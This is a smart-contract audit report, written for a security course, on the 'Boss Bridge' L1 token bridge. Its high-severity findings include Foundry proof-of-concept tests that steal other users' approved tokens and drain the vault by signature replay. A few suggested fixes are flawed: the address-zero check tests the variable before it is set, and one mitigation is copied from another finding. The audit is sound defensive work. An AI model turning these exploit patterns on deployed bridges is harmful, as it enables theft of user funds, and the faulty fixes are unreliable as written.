---
title: Boss Bridge Audit Report
author: Lokapal
date: February 5, 2025
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Boss Bridge Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Lokapal\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle


\lstset{ % define general preferences
	language=javascript,
	backgroundcolor=\color{verylightgray},
	extendedchars=true,
	basicstyle=\footnotesize\ttfamily,
	showstringspaces=false,
	showspaces=false,
	numbers=left,
	numberstyle=\footnotesize,
	numbersep=9pt,
	tabsize=2,
	breaklines=true,
	showtabs=false,
	captionpos=b,
    morecomment=[f][\color{red!60!black}]-,
    morecomment=[f][\color{green!60!black}]+,
}



Prepared by: 

- [Lokapal](https://github.com/RicardoPintos/updraft-security-reviews)
  
Lead Auditor: 

- Ricardo Pintos



# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] `TokenFactory::deployToken` uses `create` and will not work with `zkSync`](#h-1-tokenfactorydeploytoken-uses-create-and-will-not-work-with-zksync)
    - [\[H-2\] `L1BossBridge::depositTokensToL2` uses an arbitrary from in `transferFrom`](#h-2-l1bossbridgedeposittokenstol2-uses-an-arbitrary-from-in-transferfrom)
    - [\[H-3\] `L1BossBridge::constructor` approves the max amount of token transfers, which allows users to mint unlimited tokens to the L2](#h-3-l1bossbridgeconstructor-approves-the-max-amount-of-token-transfers-which-allows-users-to-mint-unlimited-tokens-to-the-l2)
    - [\[H-4\] `L1BossBridge::withdrawTokensToL1` does not check for signature replay](#h-4-l1bossbridgewithdrawtokenstol1-does-not-check-for-signature-replay)
  - [Low](#low)
    - [\[L-1\] `L1Vault::approveTo` ignores return value](#l-1-l1vaultapproveto-ignores-return-value)
    - [\[L-2\] Missing checks in `L1Vault::constructor` for `address(0)` when assigning values to address state variables](#l-2-missing-checks-in-l1vaultconstructor-for-address0-when-assigning-values-to-address-state-variables)
    - [\[L-3\] Unsafe ERC20 Operations should not be used](#l-3-unsafe-erc20-operations-should-not-be-used)
    - [\[L-4\]: In `L1BossBridge::setSigner`, state variable changes but no event is emitted](#l-4-in-l1bossbridgesetsigner-state-variable-changes-but-no-event-is-emitted)
    - [\[L-5\] Low level call in `L1BossBridge::sendToL1`](#l-5-low-level-call-in-l1bossbridgesendtol1)
  - [Informational](#informational)
    - [\[I-1\] Solidity `pragma` should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\]: State variable could be declared constant in `L1BossBridge`](#i-2-state-variable-could-be-declared-constant-in-l1bossbridge)
    - [\[I-3\]: State variable could be declared immutable in `L1Vault`](#i-3-state-variable-could-be-declared-immutable-in-l1vault)
    - [\[I-4\] In `TokenFactory`, `public` functions not used internally could be marked `external`](#i-4-in-tokenfactory-public-functions-not-used-internally-could-be-marked-external)
    - [\[I-5\] Events with missing `indexed` fields](#i-5-events-with-missing-indexed-fields)
    - [\[I-6\] PUSH0 is not supported by all chains](#i-6-push0-is-not-supported-by-all-chains)

# Protocol Summary

This project presents a simple bridge mechanism to move our ERC20 token from L1 to an L2 we're building.
The L2 part of the bridge is still under construction, so we don't include it here.

In a nutshell, the bridge allows users to deposit tokens, which are held into a secure vault on L1. Successful deposits trigger an event that our off-chain mechanism picks up, parses it and mints the corresponding tokens on L2.

# Disclaimer

The LOKAPAL team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

## Scope 

- Commit Hash: 07af21653ab3e8a8362bf5f63eb058047f562375
- In scope

```
./src/
# L1BossBridge.sol
# L1Token.sol
# L1Vault.sol
# TokenFactory.sol
```
- Solc Version: 0.8.20
- Chain(s) to deploy contracts to:
  - Ethereum Mainnet: 
    - L1BossBridge.sol
    - L1Token.sol
    - L1Vault.sol
    - TokenFactory.sol
  - ZKSync Era:
    - TokenFactory.sol
  - Tokens:
    - L1Token.sol (And copies, with different names & initial supplies)

## Roles

- Bridge Owner: A centralized bridge owner who can:
  - pause/unpause the bridge in the event of an emergency
  - set `Signers` (see below)
- Signer: Users who can "send" a token from L2 -> L1. 
- Vault: The contract owned by the bridge that holds the tokens. 
- Users: Users mainly only call `depositTokensToL2`, when they want to send tokens from L1 -> L2. 


# Executive Summary

This security review was conducted as part of Cyfrin Updraft's Smart Contract Security course.

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 4                      |
| Medium   | 0                      |
| Low      | 5                      |
| Info     | 6                      |
| Total    | 15                     |

# Findings

## High

### [H-1] `TokenFactory::deployToken` uses `create` and will not work with `zkSync`

**Description:** The `deployToken` function uses the low level `create` command. This approach will save gas, but raises multichain deployment issues:

```javascript
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    assembly {
~~>     addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```

**Impact:** In addition to Ethereum `Mainnet`, the protocol will deploy to `zkSync`. This chain doesn't support `create` for deployment. You can read the docs [here](https://docs.zksync.io/zksync-protocol/differences/evm-instructions).

**Proof of Concept:**
1. The protocol starts building its infrastructure on `Mainnet`,
2. Eventually, the `TokenFactory.sol` contract has to be deployed on `zkSync`,
3. Deployment fails, leaving the protocol without its intended L2 platform. 

**Recommended mitigation:** Unless there are additional considerations other than gas cost, consider following a deployment process compatible with both `Mainnet` and `zkSync`.

---

### [H-2] `L1BossBridge::depositTokensToL2` uses an arbitrary from in `transferFrom`

**Description:** The `depositTokensToL2` function does not check the if the msg.sender is the address that will approve the transfer of tokens.

```javascript
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
~~> token.safeTransferFrom(from, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
    emit Deposit(from, l2Recipient, amount);
}
```
**Impact:** This means that after a user approves the transfer of their tokens, anyone can use that approval to transfer to themselves all the amount approved. They just have to monitor approvals and front-run the legitimate owner of the tokens.

**Proof of Concept:** Run this test on your `L1TokenBridge.t.sol` unit suite:

```javascript
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 depositAmount = token.balanceOf(user);
    address attacker = makeAddr("attacker");
    vm.prank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attacker, depositAmount);
    tokenBridge.depositTokensToL2(user, attacker, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
    vm.stopPrank();
}
```

**Recommended mitigation:** Consider adding a `msg.sender` check that matches the `from` parameter:

```diff
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+   if (msg.sender != from) revert L1BossBridge__Unauthorized();
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
    token.safeTransferFrom(from, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
    emit Deposit(from, l2Recipient, amount);
}
```

---

### [H-3] `L1BossBridge::constructor` approves the max amount of token transfers, which allows users to mint unlimited tokens to the L2

**Description:** The `constructor` calls the `approveTo` function setting an extremely high amount of preapproved tokens.

```javascript
constructor(IERC20 _token) Ownable(msg.sender) {
    token = _token;
    vault = new L1Vault(token);
    // Allows the bridge to move tokens out of the vault to facilitate withdrawals
~~> vault.approveTo(address(this), type(uint256).max);
}
```

**Impact:** This means that after the `constructor` approves the transfer of tokens, anyone can use that approval to transfer to themselves all the amount approved. They can mint an unlimited amount of tokens, disrupting the balance between the L1 and L2 chains.

**Proof of Concept:** Run this test on your `L1TokenBridge.t.sol` unit suite:
  
```javascript
function testCanTransferFromVaultToVault() public {
    address attacker = makeAddr("attacker");

    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), attacker, vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
}
```

**Recommended mitigation:** Consider adding a `msg.sender` check that matches the `from` parameter:

```diff
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+   if (msg.sender != from) revert L1BossBridge__Unauthorized();
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
    token.safeTransferFrom(from, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
    emit Deposit(from, l2Recipient, amount);
}
```

---

### [H-4] `L1BossBridge::withdrawTokensToL1` does not check for signature replay

**Description:** The `v, r and s` values are stored on-chain when calling `L1bossBridge::sendToL1`: 

```javascript
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

~~>     (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```

And when the signer withdraw tokens back to the L1, there are no checks to prevent using again the same signature:

```javascript
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
~~>             abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
            )
        );
    }
```

**Impact:** Anyone can execute a signature replay attack after the signature is on-chain, disrupting the token balance between the L1 and L2 chains.

**Proof of Concept:** Run this test on your `L1TokenBridge.t.sol` unit suite:

```javascript
function testSignatureReplay() public {
    address attacker = makeAddr("attacker");
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

    bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance)));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));

    while(token.balanceOf(address(vault)) > 0){
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }

    assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
    vm.stopPrank();
}
```

**Recommended mitigation:** Consider adding a nonce (number only used once) or a deadline parameter in the `sendToL1` function, so the signature can't be used multiple times.

---

## Low

### [L-1] `L1Vault::approveTo` ignores return value

**Description:** The `approveTo` function ignores return value by `token.approve`:

```javascript
function approveTo(address target, uint256 amount) external onlyOwner {
    token.approve(target, amount);
}
```

**Recommended mitigation:** Ensure that all the return values of the function calls are used.

---

### [L-2] Missing checks in `L1Vault::constructor` for `address(0)` when assigning values to address state variables

**Description:** The `_token` parameter is not checked for `address(0)` in the constructor:

```javascript
    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
    }
```

**Recommended mitigation:** Check for `address(0)` when assigning values to address state variables.

```diff
// ERRORS
+   error L1Vault__NotAddressZero();

// FUNCTIONS
    constructor(IERC20 _token) Ownable(msg.sender) {
+       if (address(token) == address(0)) revert L1Vault__NotAddressZero();
        token = _token;
    }
```

---

### [L-3] Unsafe ERC20 Operations should not be used

**Description:** ERC20 functions may not behave as expected. For example: return values are not always meaningful. 

At `L1BossBridge`:

```javascript
abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
```

At `L1Vault`:

```javascript
token.approve(target, amount);
```

**Recommended mitigation:** It is recommended to use `OpenZeppelin's SafeERC20` library.

---

### [L-4]: In `L1BossBridge::setSigner`, state variable changes but no event is emitted

**Description:** State variable changes in this function but no event is emitted.

```javascript
    function setSigner(address account, bool enabled) external onlyOwner {
        signers[account] = enabled;
    }
```

**Recommended mitigation:** Consider adding the corresponding event.

```diff
// EVENTS
+   event L1BossBridge__SignerEnabled(address account);

// FUNCTIONS
    function setSigner(address account, bool enabled) external onlyOwner {
+       emit L1BossBridge__SignerEnabled(account);
        signers[account] = enabled;
    }
```

---

### [L-5] Low level call in `L1BossBridge::sendToL1`

**Description:** The use of low-level calls is error-prone. Low-level calls do not check for code existence or call success.

```javascript
(bool success,) = target.call{ value: value }(data);
```

**Recommended mitigation:** Avoid low-level calls. Check the call success. If the call is meant for a contract, check for code existence.

---

## Informational

### [I-1] Solidity `pragma` should be specific, not wide

**Description:** Multiple Solidity versions in different contracts can cause conflicts in functionality, specially with version `0.8.20`.

Version constraint `0.8.20` contains known [severe issues](https://solidity.readthedocs.io/en/latest/bugs.html)
- VerbatimInvalidDeduplication
- FullInlinerNonExpressionSplitArgumentEvaluationOrder
- MissingSideEffectsOnSelectorAccess.

**Recommended mitigation:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma` solidity `^0.8.20`;, use `pragma` solidity `0.8.20`.

---

### [I-2]: State variable could be declared constant in `L1BossBridge`

**Description:** State variables that are not updated following deployment should be declared constant to save gas.

```javascript
    uint256 public DEPOSIT_LIMIT = 100_000 ether;
```

**Recommended mitigation:** Add the `constant` attribute to state variables that never change.

```diff
+   uint256 public constant DEPOSIT_LIMIT = 100_000 ether;
-   uint256 public DEPOSIT_LIMIT = 100_000 ether;
```

---

### [I-3]: State variable could be declared immutable in `L1Vault`

**Description:** State variables that are set in the constructor should be declared immutable to save gas:

```javascript
    IERC20 public token;

    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
    }
```

**Recommended mitigation:** Add the `immutable` attribute to state variables that are only changed in the constructor:

```diff
+   IERC20 public immutable i_token;
-   IERC20 public token;

    constructor(IERC20 _token) Ownable(msg.sender) {
+       i_token = _token;
-       token = _token;
    }
```

---

### [I-4] In `TokenFactory`, `public` functions not used internally could be marked `external`

**Description:** Functions that are not called internally should be declared `external` to save gas.

```javascript
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr)

function getTokenAddressFromSymbol(string memory symbol) public view returns (address addr)
```

**Recommended mitigation:** Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

---

### [I-5] Events with missing `indexed` fields

**Description:** Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). 

At `L1BossBridge`:

```javascript
event Deposit(address from, address to, uint256 amount);
```

At `TokenFactory`:

```javascript
event TokenDeployed(string symbol, address addr);
```

**Recommended mitigation:** Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, every field should be indexed.

---

### [I-6] PUSH0 is not supported by all chains

**Description:** `Solc` compiler version `0.8.20` switches the default target EVM version to Shanghai, which means that the generated `bytecode` will include PUSH0 opcodes.

**Recommended mitigation:** Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than `mainnet` like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.
